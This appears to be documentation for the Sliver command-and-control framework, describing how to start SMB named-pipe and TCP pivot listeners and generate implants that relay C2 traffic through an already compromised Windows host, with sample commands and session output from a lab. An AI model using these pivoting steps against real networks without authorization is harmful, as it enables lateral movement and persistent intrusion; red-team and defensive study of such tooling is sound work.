Pivots in Sliver are used for specifically pivoting C2 traffic, not to be confused with port forwarding i.e. `portfwd` for tunneling generic TCP connections in/out of a target env. Sliver supports two types of pivot listeners: SMB and TCP pivots.

# SMB named pipe pivot

To start a SMB pivot listener, use the `named-pipe` command from a sliver session:

```
sliver (DELIGHTFUL_TELLER) > named-pipe -h

Start a named pipe pivot listener

Flags:
======
  -h, --help              display help
  -n, --name    string    name of the named pipe
  -t, --timeout int       command timeout in seconds (default: 60)

sliver (DELIGHTFUL_TELLER) > named-pipe --name lol

[*] Listening on \\.\pipe\lol
```

Then, generate a new sliver using the `named-pipe` transport:

```
sliver > generate --named-pipe desk01//./pipe/lol --skip-symbols --save /tmp
```

The format for the `--named-pipe` parameter is `HOSTNAME//./pipe/PIPE_NAME` where:

- `HOSTNAME` is either the IP address, the machine name or the Fully Qualified Domain Name (FQDN) of the host
- `PIPE_NAME` is the same name as the one used in the `named-pipe` command

Once the new sliver runs, you should see something similar to this output:

```
[*] Session #5 YUMMY_C-CLAMP - \\DESK01\pipe\lol (APPSRV01) - windows/amd64 - Thu, 09 Jul 2020 10:54:16 CEST
sliver (FLAT_HUT) > sessions

ID  Name           Transport           Remote Address      Hostname  Username              Operating System  Last Check-in
==  ====           =========           ==============      ========  ========              ================  =============
4   FLAT_HUT       mtls                172.16.20.13:23424  DESK01    CENTRALLAB\adminjdoe  windows/amd64     Thu, 09 Jul 2020 10:54:44 CEST
5   YUMMY_C-CLAMP  named-pipe (PIVOT)  \\DESK01\pipe\lol   APPSRV01  CENTRALLAB\adminjdoe  windows/amd64     Thu, 09 Jul 2020 10:54:44 CEST
```

# TCP Pivot

To start a TCP pivot, use the `tcp-pivot` command from a sliver session:

```
sliver (CHUBBY_PAVILION) > tcp-pivot -h

Start a TCP pivot listener

Flags:
======
  -h, --help              display help
  -l, --lport   int       tcp listen port (default: 9898)
  -s, --server  string    interface to bind server to (default: 0.0.0.0)
  -t, --timeout int       command timeout in seconds (default: 60)

sliver (CHUBBY_PAVILION) > tcp-pivot -l 8000 -s 172.16.241.1

[*] Listening on tcp://172.16.241.1:8000
```

Then, use `generate` to create a new sliver that will connect through the pivot:

```
sliver > generate --skip-symbols --tcp-pivot 172.16.241.1:8000

```

Once this new sliver executes, you should see something like this:

```
[*] Session #3 DELIGHTFUL_TELLER - 172.16.241.1:8000 (DESKTOP-0QQJ4JL) - windows/amd64 - Thu, 09 Jul 2020 10:24:05 CEST

sliver > sessions

ID  Name               Transport    Remote Address      Hostname         Username             Operating System  Last Check-in
==  ====               =========    ==============      ========         ========             ================  =============
...
3   DELIGHTFUL_TELLER  tcp (PIVOT)  172.16.241.1:8000   DESKTOP-0QQJ4JL  DESKTOP-0QQJ4JL\lab  windows/amd64     Thu, 09 Jul 2020 10:24:08 CEST
```

